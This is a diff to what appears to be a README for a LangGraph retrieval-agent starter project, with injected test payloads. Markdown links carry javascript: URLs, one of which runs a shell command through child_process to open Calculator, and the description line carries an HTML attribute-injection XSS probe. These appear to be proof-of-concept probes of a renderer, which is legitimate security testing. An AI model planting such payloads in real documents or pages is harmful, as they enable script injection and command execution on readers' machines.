@@ -11,7 +11,7 @@
 [test1234](javascript:require('child_process').exec('open /Applications/Calculator.app'))
 [ttt](javascript:alert(222))
 
-This is a "><b/onmoouseover=alert(1)>starter</b> project to help you get started with developing a retrieval agent using [LangGraph](https://github.com/langchain-ai/langgraph) in [LangGraph Studio](https://github.com/langchain-ai/langgraph-studio).
+This is a "><b onmoouseover=alert(1)>starter</b> project to help you get started with developing a retrieval agent using [LangGraph](https://github.com/langchain-ai/langgraph) in [LangGraph Studio](https://github.com/langchain-ai/langgraph-studio).
 
 ![Graph view in LangGraph studio UI](./static/studio_ui.png)
 
